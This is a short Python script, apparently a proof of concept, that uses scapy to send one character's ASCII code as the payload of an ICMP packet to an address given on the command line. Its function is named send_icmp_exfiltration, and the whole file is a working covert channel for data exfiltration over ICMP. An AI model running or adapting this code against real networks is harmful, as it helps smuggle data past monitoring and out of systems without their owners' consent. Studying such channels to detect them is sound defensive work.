import sys
from scapy.all import *

def send_icmp_exfiltration(destination_ip, character):
    ascii_value = ord(character)

    packet = IP(dst=destination_ip)/ICMP()/Raw(load=str(ascii_value))

    send(packet)

if __name__ == "__main__":
    destination_ip = sys.argv[1]
    character = sys.argv[2]

    send_icmp_exfiltration(destination_ip, character)

